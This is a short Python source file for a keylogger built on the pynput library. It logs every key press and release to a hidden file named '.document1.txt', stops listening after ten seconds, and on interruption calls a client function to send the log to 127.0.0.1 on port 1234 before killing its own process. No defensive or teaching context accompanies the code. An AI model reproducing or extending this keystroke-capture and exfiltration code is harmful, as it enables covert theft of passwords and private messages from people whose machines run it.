import platform
import time
import os  
import client
import signal
from threading import Thread
from pynput.keyboard import Listener, Controller

def get_platform():
    return platform.system()

def on_press(key):
    keyFormat = "key_press:{0}\n".format(key)
    with open('.document1.txt', '+a') as file:
        file.write(keyFormat)

def on_release(key):
    keyFormat = "key_release{0}\n".format(key)
    with open('.document1.txt', '+a') as file:
        file.write(keyFormat)


def func_handle_time(period,listener):
    time.sleep(period)
    listener.stop()


def listen_keyboard():
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            Thread(target=func_handle_time,args=(10.0,listener)).start()
            listener.join()
    except KeyboardInterrupt:
        client.send_file_securely("127.0.0.1", 1234)
        os.kill(os.getpid(), signal.SIGKILL)

        